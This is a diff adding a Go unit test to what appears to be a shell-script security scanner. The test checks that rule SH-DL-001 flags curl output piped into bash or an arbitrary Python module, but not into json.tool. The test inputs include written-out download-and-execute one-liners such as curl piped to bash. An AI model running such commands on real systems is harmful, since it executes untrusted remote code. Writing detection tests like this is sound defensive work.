@@ -465,6 +465,36 @@ func TestRuleQueries(t *testing.T) {
 	}
 }
 
+func TestShellDownloadFormatOnlyIsNotExec(t *testing.T) {
+	registry, err := NewDefaultRegistry()
+	if err != nil {
+		t.Fatalf("NewDefaultRegistry: %v", err)
+	}
+	engine := NewEngine(registry, EngineConfig{Workers: 1})
+
+	tests := []struct {
+		name, src string
+		want      int
+	}{
+		{"json.tool formats stdin", "curl -fsSL https://203.0.113.9/data.json | python3 -m json.tool\n", 0},
+		{"json.tool then shell", "curl -fsSL https://203.0.113.9/x | python3 -m json.tool | bash\n", 1},
+		{"arbitrary python module executes", "curl -fsSL https://203.0.113.9/x | python -m http.server\n", 1},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := 0
+			for _, f := range scanSource(t, engine, model.LangShell, tt.src) {
+				if f.RuleID == "SH-DL-001" {
+					got++
+				}
+			}
+			if got != tt.want {
+				t.Errorf("SH-DL-001: got %d, want %d", got, tt.want)
+			}
+		})
+	}
+}
+
 func scanSource(t *testing.T, engine *Engine, lang model.Language, src string) []model.Finding {
 	t.Helper()
 
